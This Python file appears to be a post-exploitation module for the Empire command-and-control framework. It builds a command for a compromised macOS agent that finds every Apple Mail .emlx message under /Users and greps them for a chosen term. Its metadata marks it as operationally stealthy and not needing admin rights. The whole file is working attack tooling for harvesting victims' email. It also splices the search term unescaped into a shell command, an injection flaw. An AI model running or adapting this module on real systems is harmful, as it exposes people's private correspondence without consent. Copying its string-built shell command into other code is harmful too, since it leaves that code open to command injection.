class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'SearchEmail',
            'Author': ['@harmj0y'],
            'Description': ("Searches for Mail .emlx messages, optionally only returning "
                            "messages with the specified SeachTerm."),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "https://davidkoepi.wordpress.com/2013/07/06/macforensics5/"
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SearchTerm' : {
                'Description'   :   "Term to grep for in email messages.",
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        searchTerm = self.options['SearchTerm']['Value']
        script = "cmd = \"find /Users/ -name *.emlx 2>/dev/null"
        if searchTerm != "":
            script += "|xargs grep -i '"+searchTerm+"'\""
        else:
            script += "\""
        script += "\nrun_command(cmd)"
        return script